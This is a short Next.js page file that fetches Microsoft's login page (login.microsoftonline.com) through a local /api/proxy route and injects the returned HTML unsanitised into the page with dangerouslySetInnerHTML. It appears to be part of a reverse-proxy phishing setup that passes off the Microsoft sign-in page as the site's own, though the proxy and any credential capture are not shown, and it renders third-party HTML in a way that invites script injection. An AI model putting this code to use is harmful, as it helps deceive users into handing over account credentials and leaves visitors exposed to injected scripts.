export async function getServerSideProps(context) {
    try {
        const url = `http://${context.req.headers.host}/api/proxy?url=https://login.microsoftonline.com/`;

        const res = await fetch(url);
        if (!res.ok) {
            throw new Error('Network response was not ok');
        }
        const text = await res.text();

        return {
            props: {
                content: text
            }
        };
    } catch (error) {
        console.error('Error fetching content:', error);
        return {
            props: {
                content: 'Error fetching content'
            }
        };
    }
}

export default function Home({ content }) {
    return (
        <div dangerouslySetInnerHTML={{ __html: content }} />
    );
}
